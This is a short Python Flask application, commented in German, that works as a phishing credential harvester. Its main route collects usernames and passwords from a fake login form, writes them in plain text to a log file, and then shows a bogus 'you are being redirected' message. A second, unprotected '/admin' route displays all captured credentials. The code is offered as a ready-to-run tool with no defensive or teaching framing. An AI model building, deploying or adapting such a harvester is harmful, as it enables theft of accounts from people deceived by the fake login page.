from flask import Flask, render_template, request
from datetime import datetime
import os

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")

        # Sicherstellen, dass log.txt existiert
        try:
            with open("log.txt", "a") as f:
                f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Username: {username} | Password: {password}\n")
        except Exception as e:
            return f"<h3>Fehler beim Speichern: {str(e)}</h3>"

        return "<h2>Danke. Du wirst weitergeleitet...</h2>"

    return render_template("index.html")

@app.route("/admin")
def admin():
    log_path = "log.txt"
    if not os.path.exists(log_path):
        # Datei erzeugen, wenn sie fehlt
        open(log_path, "w").close()

    try:
        with open(log_path, "r") as f:
            logs = f.readlines()

        if not logs:
            return "<h3>Es wurden noch keine Daten eingegeben.</h3>"

        # HTML-safe Ausgabe
        content = "<br>".join(line.strip().replace("<", "&lt;").replace(">", "&gt;") for line in logs)
        return f"<h3>Login-Daten:</h3><div style='font-family: monospace'>{content}</div>"

    except Exception as e:
        return f"<h3>Fehler beim Anzeigen der Logs: {str(e)}</h3>"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
